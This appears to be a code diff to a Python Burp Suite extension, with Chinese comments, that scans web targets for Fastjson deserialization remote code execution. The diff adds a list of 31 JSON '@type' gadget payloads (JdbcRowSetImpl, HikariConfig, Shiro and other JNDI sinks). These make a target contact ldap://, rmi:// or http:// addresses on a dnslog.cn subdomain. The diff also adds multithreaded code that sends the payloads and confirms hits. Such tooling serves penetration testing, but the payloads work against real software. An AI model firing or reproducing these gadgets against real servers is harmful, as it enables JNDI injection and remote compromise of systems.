@@ -7,6 +7,9 @@ import time
 import os
 import requests
 import random
+import inspect
+from threading import Thread
+from queue import Queue
 
 headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36"}
 
@@ -48,6 +51,69 @@ def records_dnslog(random_str, getrecords_cookie):
         return True
     else:
         return False
+
+
+# 获取dnslog前缀和dnspayload
+# MHXLHDF1 {"@type":"java.net.Inet4Address","val":"MHXLHDF1.oyiare.dnslog.cn"}
+def get_dnsPayload(payload, dnslog_domain):
+    randomStr = get_random_str()  # 获取随机值
+    dnslog_random_domain = randomStr + '.' + dnslog_domain  # dnslog的随机子域名
+    dnsPayload = payload.replace('dnslog_random_domain', dnslog_random_domain)
+    return randomStr, dnsPayload
+
+
+# 获取所有带dnslog的payload字典
+def get_dnsPayloadQueue(dnslog_domain):
+    dnsPayloadQueue = Queue(-1)
+    payload_1 = '{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://dnslog_random_domain/Exploit","autoCommit":true}}}'
+    payload2_a = '"a":{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://dnslog_random_domain"}}""},\n'
+    payload2_b = '"b":{{"@type":"java.net.URL","val":"http://dnslog_random_domain"}:"x"},\n'
+    payload2_c = '"c":{{"@type":"java.net.URL","val":"http://dnslog_random_domain"}:0,\n'
+    payload2_d = '"d":Set[{"@type":"java.net.URL","val":"http://dnslog_random_domain"}],\n'
+    payload2_e = '"e":Set[{"@type":"java.net.URL","val":"http://dnslog_random_domain"},\n'
+    payload_2 = '{\n' + payload2_a + payload2_b + payload2_c + payload2_d + payload2_e + '}'
+    payload_3 = '{"@type":"java.net.Inet4Address","val":"dnslog_random_domain"}'
+    payload_4 = '{"@type":"java.net.Inet6Address","val":"dnslog_random_domain"}'
+    payload_5 = '{"@type": "java.net.InetSocketAddress"{"address":, "val":"dnslog_random_domain"}, "port":80}'
+    payload_6 = '{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"rmi://dnslog_random_domain", "autoCommit":true}'
+    payload_7 = '{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"rmi://dnslog_random_domain", "autoCommit":true}'
+    payload_8 = '{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"rmi://dnslog_random_domain","autoCommit":true]}'
+    payload_9 = '{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"rmi://dnslog_random_domain"}}'
+    payload_10 = '{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://dnslog_random_domain","autoCommit":true}}'
+    payload_11 = '{{"@type":"java.net.URL","val":"http://dnslog_random_domain"}:"aaa"}'
+    payload_12 = '{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://dnslog_random_domain","instance":{"$ref":"$.instance"}}'
+    payload_13 = '{"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory", "jndiNames":["ldap://dnslog_random_domain"], "Realms":[""]}'
+    payload_14 = '{"@type":"com.caucho.config.types.ResourceRef","lookupName": "ldap://dnslog_random_domain", "value": {"$ref":"$.value"}}'
+    payload_15 = '[{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://dnslog_random_domain","autoCommit":true}]'
+    payload_16 = '{"@type":"org.apache.xbean.propertyeditor.JndiConverter","asText":"ldap://dnslog_random_domain"}'
+    payload_17 = '{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup", "jndiNames":["ldap://dnslog_random_domain"], "tm": {"$ref":"$.tm"}}'
+    payload_18 = '{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"ldap://dnslog_random_domain"}}'
+    payload_19 = '{"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://dnslog_random_domain"}'
+    payload_20 = '{"@type":"com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://dnslog_random_domain"}'
+    payload_21 = '{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://dnslog_random_domain"}'
+    payload_22 = '{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://dnslog_random_domain"}'
+    payload_23 = '{"@type":"org.apache.commons.proxy.provider.remoting.SessionBeanProvider","jndiName":"ldap://dnslog_random_domain","Object":"a"}'
+    payload_24 = '{"@type":"org.apache.cocoon.components.slide.impl.JMSContentInterceptor", "parameters": {"@type":"java.util.Hashtable","java.naming.factory.initial":"com.sun.jndi.rmi.registry.RegistryContextFactory","topic-factory":"ldap://dnslog_random_domain"}, "namespace":""}'
+    payload_25 = '{"@type":"org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory", "tmJndiName": "ldap://dnslog_random_domain", "tmFromJndi": true, "transactionManager": {"$ref":"$.transactionManager"}}'
+    payload_26 = '{"@type":"org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory", "tmJndiName": "ldap://dnslog_random_domain", "tmFromJndi": true, "transactionManager": {"$ref":"$.transactionManager"}}'
+    payload_27 = '{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","healthCheckRegistry":"ldap://dnslog_random_domain"}'
+    payload_28 = '{"@type":"org.apache.cxf.jaxrs.model.wadl.WadlGenerator","schemaLocations": "http://dnslog_random_domain"}'
+    payload_29 = '{"@type":"org.apache.cxf.jaxrs.utils.schemas.SchemaHandler","schemaLocations": "http://dnslog_random_domain"}'
+    payload_30 = '{"@type":"org.apache.commons.jelly.impl.Embedded","script": "http://dnslog_random_domain"}'
+    payload_31 = '{"@type":"javax.swing.JEditorPane","page": "http://dnslog_random_domain"}'
+
+    payloads = []
+    Variable = inspect.currentframe().f_locals  # 获取所有变量
+    for _ in Variable.keys():                   # 遍历所有变量，获取payload的变量
+        if 'payload_' in _:
+            payloads.append(Variable[_])
+
+    for payload in payloads:
+        randomStr, dnsPayload = get_dnsPayload(payload, dnslog_domain)
+        dnsPayloadQueue.put([randomStr, dnsPayload])
+
+    return dnsPayloadQueue
+
 
 
 class BurpExtender(IBurpExtender, IMessageEditorTabFactory, IContextMenuFactory, IScannerCheck):
@@ -133,155 +199,48 @@ class BurpExtender(IBurpExtender, IMessageEditorTabFactory, IContextMenuFactory,
                 return True
 
     def sen_payloads(self, reqUrl, reqHeaders, httpService):
-        def payloads1():
-            random_str = get_random_str()  # 获取随机值
-            dnslog_random_domain = random_str + '.' + dnslog_domain  # dnslog的随机子域名
+        def attack(dnsPayloadQueue, getrecords_cookie):
+            while not dnsPayloadQueue.empty():
+                randomStr, dnsPayload = dnsPayloadQueue.get()
+                newBody = self._helpers.stringToBytes(dnsPayload)  # 将字符串转换为字节 https://portswigger.net/burp/extender/api/burp/IExtensionHelpers.html#stringToBytes(java.lang.String)
+                newRequest = self._helpers.buildHttpMessage(reqHeaders, newBody)  # 重构json格式的数据不能用buildParameter，要用buildHttpMessage替换整个body重构http消息。 https://portswigger.net/burp/extender/api/burp/IExtensionHelpers.html#buildHttpMessage(java.util.List,%20byte[])
+                newIHttpRequestResponse = self._callbacks.makeHttpRequest(httpService, newRequest)  # 发送数据
+                # response = newIHttpRequestResponse.getResponse()  # 获取响应包
+                # analyzedIResponseInfo = self._helpers.analyzeRequest(response)  # analyzeResponse方法可用于分析HTTP响应，并获取有关它的各种关键详细信息。返回：IResponseInfo可以查询的对象以获取有关响应的详细信息。
+                # resBodys = response[analyzedIResponseInfo.getBodyOffset():].tostring()
+                newUrl = self._helpers.analyzeRequest(newIHttpRequestResponse).getUrl()
 
-            payload1 = '{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://' + dnslog_random_domain + '/Exploit","autoCommit":true}}}'
-            newBody = self._helpers.stringToBytes(payload1)  # 将字符串转换为字节 https://portswigger.net/burp/extender/api/burp/IExtensionHelpers.html#stringToBytes(java.lang.String)
-            newRequest = self._helpers.buildHttpMessage(reqHeaders, newBody)  # 重构json格式的数据不能用buildParameter，要用buildHttpMessage替换整个body重构http消息。 https://portswigger.net/burp/extender/api/burp/IExtensionHelpers.html#buildHttpMessage(java.util.List,%20byte[])
-            newIHttpRequestResponse = self._callbacks.makeHttpRequest(httpService, newRequest)  # 发送数据
-            # response = newIHttpRequestResponse.getResponse()  # 获取响应包
-            # analyzedIResponseInfo = self._helpers.analyzeRequest(response)  # analyzeResponse方法可用于分析HTTP响应，并获取有关它的各种关键详细信息。返回：IResponseInfo可以查询的对象以获取有关响应的详细信息。
-            # resBodys = response[analyzedIResponseInfo.getBodyOffset():].tostring()
-            newUrl = self._helpers.analyzeRequest(newIHttpRequestResponse).getUrl()
-
-            time.sleep(5)  # 等十秒再查询，可能会有延迟
-            if records_dnslog(random_str, getrecords_cookie):
-                print '[+] {}'.format(newUrl)
-                self.save(newUrl)
-                self.issues.append(CustomScanIssue(
-                    newIHttpRequestResponse.getHttpService(),
-                    newUrl,
-                    [newIHttpRequestResponse],
-                    "FastJson RCE",
-                    "dnslog.cn PHPSESSID={}".format(getrecords_cookie),
-                    "High"))
-            else:
-                print '[-] {}'.format(reqUrl)
-
-        def payloads2():
-            random_str = get_random_str()  # 获取随机值
-            dnslog_random_domain = random_str + '.' + dnslog_domain  # dnslog的随机子域名
-            payload2_a = '"a":{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://' + dnslog_random_domain + '"}}""},\n'
-            payload2_b = '"b":{{"@type":"java.net.URL","val":"http://' + dnslog_random_domain + '"}:"x"},\n'
-            payload2_c = '"c":{{"@type":"java.net.URL","val":"http://' + dnslog_random_domain + '"}:0,\n'
-            payload2_d = '"d":Set[{"@type":"java.net.URL","val":"http://' + dnslog_random_domain + '"}],\n'
-            payload2_e = '"e":Set[{"@type":"java.net.URL","val":"http://' + dnslog_random_domain + '"},\n'
-            payload2 = '{\n' + payload2_a + payload2_b + payload2_c + payload2_d + payload2_e + '}'
-
-            newBody = self._helpers.stringToBytes(payload2)  # 将字符串转换为字节 https://portswigger.net/burp/extender/api/burp/IExtensionHelpers.html#stringToBytes(java.lang.String)
-            newRequest = self._helpers.buildHttpMessage(reqHeaders, newBody)  # 重构json格式的数据不能用buildParameter，要用buildHttpMessage替换整个body重构http消息。 https://portswigger.net/burp/extender/api/burp/IExtensionHelpers.html#buildHttpMessage(java.util.List,%20byte[])
-            newIHttpRequestResponse = self._callbacks.makeHttpRequest(httpService, newRequest)  # 发送数据
-            newUrl = self._helpers.analyzeRequest(newIHttpRequestResponse).getUrl()
-
-            time.sleep(5)  # 等十秒再查询，可能会有延迟
-            if records_dnslog(random_str, getrecords_cookie):
-                print '[+] {}'.format(newUrl)
-                self.save(newUrl)
-                self.issues.append(CustomScanIssue(
-                    newIHttpRequestResponse.getHttpService(),
-                    newUrl,
-                    [newIHttpRequestResponse],
-                    "FastJson RCE",
-                    "dnslog.cn PHPSESSID={}".format(getrecords_cookie),
-                    "High"))
-            else:
-                print '[-] {}'.format(reqUrl)
-
-        def payloads3():
-            random_str = get_random_str()  # 获取随机值
-            dnslog_random_domain = random_str + '.' + dnslog_domain  # dnslog的随机子域名
-
-
-            payload3 = '{"@type":"java.net.Inet4Address","val":"' + dnslog_random_domain + '"}'
-            newBody = self._helpers.stringToBytes(payload3)  # 将字符串转换为字节 https://portswigger.net/burp/extender/api/burp/IExtensionHelpers.html#stringToBytes(java.lang.String)
-            newRequest = self._helpers.buildHttpMessage(reqHeaders, newBody)  # 重构json格式的数据不能用buildParameter，要用buildHttpMessage替换整个body重构http消息。 https://portswigger.net/burp/extender/api/burp/IExtensionHelpers.html#buildHttpMessage(java.util.List,%20byte[])
-            newIHttpRequestResponse = self._callbacks.makeHttpRequest(httpService, newRequest)  # 发送数据
-            # response = newIHttpRequestResponse.getResponse()  # 获取响应包
-            # analyzedIResponseInfo = self._helpers.analyzeRequest(response)  # analyzeResponse方法可用于分析HTTP响应，并获取有关它的各种关键详细信息。返回：IResponseInfo可以查询的对象以获取有关响应的详细信息。
-            # resBodys = response[analyzedIResponseInfo.getBodyOffset():].tostring()
-            newUrl = self._helpers.analyzeRequest(newIHttpRequestResponse).getUrl()
-
-            time.sleep(5)  # 等十秒再查询，可能会有延迟
-            if records_dnslog(random_str, getrecords_cookie):
-                print '[+] {}'.format(newUrl)
-                self.save(newUrl)
-                self.issues.append(CustomScanIssue(
-                    newIHttpRequestResponse.getHttpService(),
-                    newUrl,
-                    [newIHttpRequestResponse],
-                    "FastJson RCE",
-                    "dnslog.cn PHPSESSID={}".format(getrecords_cookie),
-                    "High"))
-            else:
-                print '[-] {}'.format(reqUrl)
-
-        def payloads4():
-            random_str = get_random_str()  # 获取随机值
-            dnslog_random_domain = random_str + '.' + dnslog_domain  # dnslog的随机子域名
-
-
-            payload4 = '{"@type":"java.net.Inet6Address","val":"' + dnslog_random_domain + '"}'
-            newBody = self._helpers.stringToBytes(payload4)  # 将字符串转换为字节 https://portswigger.net/burp/extender/api/burp/IExtensionHelpers.html#stringToBytes(java.lang.String)
-            newRequest = self._helpers.buildHttpMessage(reqHeaders, newBody)  # 重构json格式的数据不能用buildParameter，要用buildHttpMessage替换整个body重构http消息。 https://portswigger.net/burp/extender/api/burp/IExtensionHelpers.html#buildHttpMessage(java.util.List,%20byte[])
-            newIHttpRequestResponse = self._callbacks.makeHttpRequest(httpService, newRequest)  # 发送数据
-            # response = newIHttpRequestResponse.getResponse()  # 获取响应包
-            # analyzedIResponseInfo = self._helpers.analyzeRequest(response)  # analyzeResponse方法可用于分析HTTP响应，并获取有关它的各种关键详细信息。返回：IResponseInfo可以查询的对象以获取有关响应的详细信息。
-            # resBodys = response[analyzedIResponseInfo.getBodyOffset():].tostring()
-            newUrl = self._helpers.analyzeRequest(newIHttpRequestResponse).getUrl()
-
-            time.sleep(5)  # 等十秒再查询，可能会有延迟
-            if records_dnslog(random_str, getrecords_cookie):
-                print '[+] {}'.format(newUrl)
-                self.save(newUrl)
-                self.issues.append(CustomScanIssue(
-                    newIHttpRequestResponse.getHttpService(),
-                    newUrl,
-                    [newIHttpRequestResponse],
-                    "FastJson RCE",
-                    "dnslog.cn PHPSESSID={}".format(getrecords_cookie),
-                    "High"))
-            else:
-                print '[-] {}'.format(reqUrl)
-
-        def payloads5():
-            random_str = get_random_str()  # 获取随机值
-            dnslog_random_domain = random_str + '.' + dnslog_domain  # dnslog的随机子域名
-
-
-            payload5 = '{"@type": "java.net.InetSocketAddress"{"address":, "val":"' + dnslog_random_domain + '"}, "port":80}'
-            newBody = self._helpers.stringToBytes(payload5)  # 将字符串转换为字节 https://portswigger.net/burp/extender/api/burp/IExtensionHelpers.html#stringToBytes(java.lang.String)
-            newRequest = self._helpers.buildHttpMessage(reqHeaders, newBody)  # 重构json格式的数据不能用buildParameter，要用buildHttpMessage替换整个body重构http消息。 https://portswigger.net/burp/extender/api/burp/IExtensionHelpers.html#buildHttpMessage(java.util.List,%20byte[])
-            newIHttpRequestResponse = self._callbacks.makeHttpRequest(httpService, newRequest)  # 发送数据
-            # response = newIHttpRequestResponse.getResponse()  # 获取响应包
-            # analyzedIResponseInfo = self._helpers.analyzeRequest(response)  # analyzeResponse方法可用于分析HTTP响应，并获取有关它的各种关键详细信息。返回：IResponseInfo可以查询的对象以获取有关响应的详细信息。
-            # resBodys = response[analyzedIResponseInfo.getBodyOffset():].tostring()
-            newUrl = self._helpers.analyzeRequest(newIHttpRequestResponse).getUrl()
-
-            time.sleep(5)  # 等十秒再查询，可能会有延迟
-            if records_dnslog(random_str, getrecords_cookie):
-                print '[+] {}'.format(newUrl)
-                self.save(newUrl)
-                self.issues.append(CustomScanIssue(
-                    newIHttpRequestResponse.getHttpService(),
-                    newUrl,
-                    [newIHttpRequestResponse],
-                    "FastJson RCE",
-                    "dnslog.cn PHPSESSID={}".format(getrecords_cookie),
-                    "High"))
-            else:
-                print '[-] {}'.format(reqUrl)
+                time.sleep(5)  # 等十秒再查询，可能会有延迟
+                if records_dnslog(randomStr, getrecords_cookie):
+                    print '[+] {} : {}'.format(newUrl, dnsPayload)
+                    self.save(newUrl)
+                    self.issues.append(CustomScanIssue(
+                        newIHttpRequestResponse.getHttpService(),
+                        newUrl,
+                        [newIHttpRequestResponse],
+                        "FastJson RCE",
+                        "dnslog.cn PHPSESSID={}".format(getrecords_cookie),
+                        "High"))
+                else:
+                    print '[-] {} : {}'.format(reqUrl, dnsPayload)
 
         getrecords_cookie, dnslog_domain = get_dnslog()  # 从dnslog获取域名和cookies
 
-        payloads1()
-        payloads2()
-        payloads3()
-        payloads4()
-        payloads5()
+        dnsPayloadQueue = get_dnsPayloadQueue(dnslog_domain)
 
+        # 多线程跑每个payload
+        threads = []
+        for i in range(10):
+            t = Thread(target=attack, args=(dnsPayloadQueue, getrecords_cookie))
+            t.start()
+            threads.append(t)
 
+        for t in threads:
+            t.join()
+
+        print '-'*50 + 'end' + '-'*50
+        # for randomStr in dnsPayloadDict:
+        #     attack(randomStr, dnsPayloadDict[randomStr], getrecords_cookie)
 
 
     # 开始检测
